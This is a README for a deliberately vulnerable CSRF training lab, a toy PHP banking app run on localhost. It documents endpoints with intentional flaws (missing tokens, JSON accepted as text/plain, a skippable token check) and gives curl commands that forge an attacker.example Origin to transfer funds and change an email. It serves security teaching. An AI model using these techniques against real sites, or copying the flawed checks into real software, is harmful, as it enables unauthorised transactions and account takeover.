# csrf-basic

Companion lab for [Cross-Site Request Forgery: The Complete 2026 Practitioner Guide](https://techearl.com/cross-site-request-forgery). A toy single-user "bank" app with four endpoints that mirror the most common CSRF outcomes I still see in 2026: a classic form target, a JSON endpoint that accepts `text/plain`, a broken-token-check endpoint, and one properly defended reference endpoint.

## Endpoints

| Path | Method | State | Defence |
|---|---|---|---|
| `/login.php` | POST | sets session cookie `CSRFLABSESSID` with `SameSite=Lax` | n/a |
| `/dashboard.php` | GET | reads balance, email, token | n/a |
| `/transfer.php` | POST | moves money | **vulnerable**, no token, no Origin |
| `/api/transfer.php` | POST | moves money, JSON body | **vulnerable**, calls `json_decode` regardless of `Content-Type` |
| `/email/change.php` | POST | changes email | **broken**, token check only runs when token field is present |
| `/strict/transfer.php` | POST | moves money | defended: Origin allow-list + per-session token + `SameSite=Strict` cookie reissue |
| `/attacker/csrf.html` | GET | attacker landing page (auto-submits the classic form target) | n/a |

## Running

```bash
docker compose up -d --build csrf-basic
```

Listens on `http://127.0.0.1:8089`. Visit the landing page in a browser for the endpoint reference and live state view.

## Expected exploit paths

Maintain one cookie jar throughout. The classic CSRF reproduction is "log in as the victim, then send the attacker's request and check the side effect".

### 0. Log in

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -d 'username=alice&password=alice123' \
  http://127.0.0.1:8089/login.php
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  http://127.0.0.1:8089/dashboard.php
```

Confirms `balance: $1000`, captures the session cookie.

### 1. Classic form-CSRF (no token, no Origin check)

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H 'Origin: http://attacker.example' \
  -H 'Referer: http://attacker.example/csrf.html' \
  -d 'to=mallory&amount=500' \
  http://127.0.0.1:8089/transfer.php
```

`OK: transferred $500 to mallory. New balance: $500.` The forged `Origin` header proves the endpoint never looked.

### 2. JSON via text/plain smuggle

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H 'Origin: http://attacker.example' \
  -H 'Content-Type: text/plain' \
  --data '{"to":"mallory","amount":250}' \
  http://127.0.0.1:8089/api/transfer.php
```

Server returns `{"ok":true,"balance":250,"received_content_type":"text\/plain"}`. `text/plain` is CORS-safe so this skips the preflight `application/json` would have triggered.

### 3. Broken-token-check on /email/change.php (omit the field)

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H 'Origin: http://attacker.example' \
  -d 'email=mallory@evil.example' \
  http://127.0.0.1:8089/email/change.php
```

`OK: email updated to mallory@evil.example.` The dashboard log shows `token ABSENT, check skipped`.

### 4. Defended endpoint refuses cross-origin

```bash
# Attempt with forged Origin and no token: 403
curl -s -o /dev/null -w '%{http_code}\n' \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H 'Origin: http://attacker.example' \
  -d 'to=mallory&amount=100' \
  http://127.0.0.1:8089/strict/transfer.php
# -> 403

# Pull the per-session token and replay with matching Origin + token
TOKEN=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  http://127.0.0.1:8089/dashboard.php | awk '/^csrf:/ {print $2}')
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H "Origin: http://127.0.0.1:8089" \
  -H "Referer: http://127.0.0.1:8089/dashboard.php" \
  -d "to=alice-savings&amount=100&csrf=$TOKEN" \
  http://127.0.0.1:8089/strict/transfer.php
# -> OK: transferred $100 ...
```

## Safety

Bound to `127.0.0.1` by default. Do not expose this container. The whole point is that anyone who can reach the lab through a victim's browser can mutate the victim's "account" by hand.

## Tearing down

```bash
docker compose down csrf-basic
```

Session state lives in `/tmp` inside the container, so a `docker compose down` resets everything.
